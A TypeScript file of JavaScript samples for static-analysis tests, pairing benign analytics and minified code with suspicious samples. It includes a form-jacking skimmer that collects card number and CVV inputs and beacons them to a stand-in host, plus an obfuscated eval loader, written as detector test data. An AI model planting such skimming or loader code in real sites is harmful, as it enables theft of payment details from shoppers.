/**
 * JavaScript samples for static-analysis tests. The "skimmer" samples imitate
 * well-known public patterns of payment-form skimming in a harmless form
 * (they point at reserved .example/.test domains).
 */

/** A typical analytics snippet: cookies, storage, beacons. Should NOT look suspicious. */
export const BENIGN_ANALYTICS = `
(function (w, d) {
  var cid = (d.cookie.match(/_cid=([^;]+)/) || [])[1];
  if (!cid) {
    cid = Math.random().toString(36).slice(2);
    d.cookie = '_cid=' + cid + '; path=/; max-age=63072000';
  }
  var queue = JSON.parse(w.localStorage.getItem('_q') || '[]');
  function track(event, props) {
    var body = JSON.stringify({ cid: cid, e: event, p: props, u: location.href });
    if (navigator.sendBeacon) navigator.sendBeacon('https://collect.analytics.example/v1/e', body);
    else fetch('https://collect.analytics.example/v1/e', { method: 'POST', body: body, keepalive: true });
  }
  w.analytics = { track: track, queue: queue };
  track('pageview', {});
})(window, document);
`;

/** Minified but not obfuscated library code. Should not trigger obfuscation. */
export const MINIFIED_LIBRARY = Array.from(
  { length: 40 },
  (_, i) =>
    `function a${i}(t,e){var n=t.length,r=0;for(;r<n;r++){if(e(t[r],r)===!1)break}return t}var b${i}=function(t){return typeof t==="string"?t.trim():String(t)};`,
).join('');

/** Classic form-jacking skimmer pattern (harmless reimplementation). */
export const SKIMMER = `
(function () {
  function grab() {
    var data = {};
    var fields = document.querySelectorAll('input[name*="card"], input[autocomplete="cc-number"], input[name*="cvv"]');
    for (var i = 0; i < fields.length; i++) data[fields[i].name] = fields[i].value;
    var img = new Image();
    img.src = 'https://cdn-metrics.exfil.example/p.gif?d=' + btoa(JSON.stringify(data));
  }
  document.addEventListener('submit', grab, true);
  document.addEventListener('keyup', function (e) { if (e.target.name === 'cardnumber') grab(); });
})();
`;

/** Obfuscated loader with string table, hex identifiers, encoded strings and eval. */
export function obfuscatedLoader(): string {
  const table = Array.from({ length: 60 }, (_, i) => `'\\x73\\x74\\x72\\x${(30 + (i % 10)).toString()}'`).join(',');
  const idents = Array.from({ length: 25 }, (_, i) => `var _0x${(0x1a2b + i).toString(16)}=${i};`).join('');
  const blob = 'QWxsIHlvdXIgYmFzZSBhcmUgYmVsb25nIHRvIHVz'.repeat(8) + 'ZXhmaWx0cmF0ZQ==';
  return `var _0x4f2a=[${table}];${idents}
var _0xdec=function(i){return _0x4f2a[i-0x0];};
var payload=atob('${blob}');var p2=atob(_0xdec(1));var p3=atob(_0xdec(2));
eval(payload);`;
}
